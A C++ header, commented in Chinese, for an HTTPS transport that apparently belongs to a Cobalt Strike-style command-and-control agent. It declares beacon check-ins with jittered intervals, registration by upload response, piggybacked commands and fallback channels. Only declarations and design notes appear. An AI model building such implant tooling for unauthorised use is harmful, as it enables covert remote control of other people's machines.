// Core/Comms/Transports/Https/HttpsTransport.hpp
// HTTPS 传输(Phase 1, CS 标准形态):
//   POST = 上传(metadata/心跳/命令结果/推送), 响应体**回流上层**(注册确认/捎带命令,
//         毫秒级交付, 与 TCP push 语义等价 —— CS 的首次上传响应即完成注册)。
//   GET  = 周期拉取(beacon check-in), 节流 = 心跳 base ± jitter(SetConfig 下发即时生效)。
//          抖动**到点时抽样一次并固化为下次时刻**; 每次 Recv 现抽现比会让判定退化成
//          "抽到多小就多早放行", 间隔塌缩到下界(见 Recv 内注释)。
//          未注册期(sid=0)改走 1s 快速档 —— 与 DNS/ICMP 的 fast_throttle 同义(见 ArmNextGet)。
//   URL 分离: cfg.url = GET 路径, cfg.upload_url = POST 路径(空 = 同 url), CS 式形态。
// 落线: body = Encrypt(frame), 无 [4B] 帧头, 无伪装壳(mimic 仅 TCP); 加密沿用 CryptoManager。
// 线程: Send/Recv 由上层单线程调度; 内部互斥保护状态。
#pragma once

#include <deque>

#include <atomic>
#include <chrono>
#include <cstdint>
#include <memory>
#include <mutex>
#include <string>
#include <vector>

#include "Core/Comms/Session/HeartbeatPolicy.hpp"
#include "Core/Comms/Transports/ITransport.hpp"
#include "Core/Comms/Platform/IHttpOps.hpp"
#include "Core/Comms/Transports/Internal/PollClock.hpp"

namespace cleat {

	class HttpsTransport : public ITransport {
	public:
		explicit HttpsTransport(std::unique_ptr<IHttpOps> http);
		~HttpsTransport() override;

		HttpsTransport(const HttpsTransport&) = delete;
		HttpsTransport& operator=(const HttpsTransport&) = delete;
		HttpsTransport(HttpsTransport&&) = delete;
		HttpsTransport& operator=(HttpsTransport&&) = delete;

		bool Connect(const TransportConfig& cfg) override;
		void Disconnect() override;
		bool IsConnected() const override;
	
	ChannelHealth HealthNow() const override;
		bool Send(const std::vector<uint8_t>& frame) override;
		bool Recv(std::vector<uint8_t>& frame, int timeout_ms) override;

		TransportType Type() const override { return TransportType::Https; }

		/// v1.5 节奏合一(设计): 距下一拍 GET 到期(掩码窗长源; 0 = 已到期/未武装)
		uint32_t NextPollDueInMs() const override { return get_clock_.NextDueInMs(); }
		int Priority() const override { return 1; }   // 降级链: TCP 之后
		void Reset() override;

	private:
		// GET 结果三态: 有帧 / 200 空 body(无数据, 非错误) / 事务失败
		enum class GetResult { Frame, Empty, Failed };

		GetResult do_get(std::vector<uint8_t>& frame);   // 调用方持锁
		bool do_post(const std::vector<uint8_t>& frame); // 调用方持锁

		/// 构造 GET 取件 URL: 空闲态裸 url(服务端探活护栏); 有 mid/sid 时带
		/// ?m=<base32url(身份块)>(节拍合一 A1.2, 与服务端 S1 落线格式锁步)
		std::string BuildGetUrl();

		std::unique_ptr<IHttpOps> http_;
		TransportConfig cfg_;
		std::atomic<bool> connected_{ false };
		std::mutex mutex_;

		// POST 响应缓存(注册确认/捎带命令), Recv 优先消费 —— CS 式响应即通道。
		// L2 修复: 多帧队列(Send 与 Recv 并发时旧实现单帧 pending 会覆盖丢帧)
		std::deque<std::vector<uint8_t>> pending_;
		/// POST 响应缓存硬上限(条): 防上层消费停滞时无界增长; 超限丢最旧(见 EnqueuePending)
		static constexpr size_t kPendingMaxFrames = 256;
		/// 入队 POST 响应帧(调用方持 mutex_); 超上限丢最旧并 WARN
		void EnqueuePending(std::vector<uint8_t> frame);
		/// 统一节拍(节拍合一 A1/A2): 唯一抖动模型 HeartbeatPolicy + 本通道一个定时器。
		/// fast(未注册/上行积压)=1s; active(刚有上行)=active_interval_ms; 空闲=base±抖动+丢拍
		HeartbeatPolicy get_policy_;
		PollClock get_clock_;
		/// 自上次 GET 以来是否有成功 POST(interact/active 档输入; A2: POST 完成即 ArmNow)
		bool uploaded_since_last_get_ = false;
		int get_decrypt_fail_streak_ = 0;
	
	/// Degraded 信号位
	std::atomic<bool> degraded_{ false };
	void MarkDegraded(const char* why);
	void ClearDegraded() { degraded_.store(false); }
	};

	// 工厂(声明见 ITransport.hpp)
	std::unique_ptr<ITransport> CreateHttpsTransport();

} // namespace cleat
